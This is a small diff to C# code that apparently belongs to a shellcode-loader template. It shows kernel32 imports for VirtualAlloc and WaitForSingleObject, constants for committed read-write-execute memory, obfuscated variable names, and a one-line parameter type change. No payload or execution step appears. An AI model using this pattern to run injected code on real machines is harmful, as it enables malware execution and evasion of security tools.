@@ -38,7 +38,7 @@
 			private static UInt32 VAR40 = 0x1000;
 			private static UInt32 VAR41 = 0x40;
 			[DllImport("kernel32")]
-			private static extern IntPtr VirtualAlloc(UInt32 VAR21, IntPtr VAR12, UInt32 VAR16, UInt32 VAR8);
+			private static extern IntPtr VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
 			[DllImport("kernel32")]
 			private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
 			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
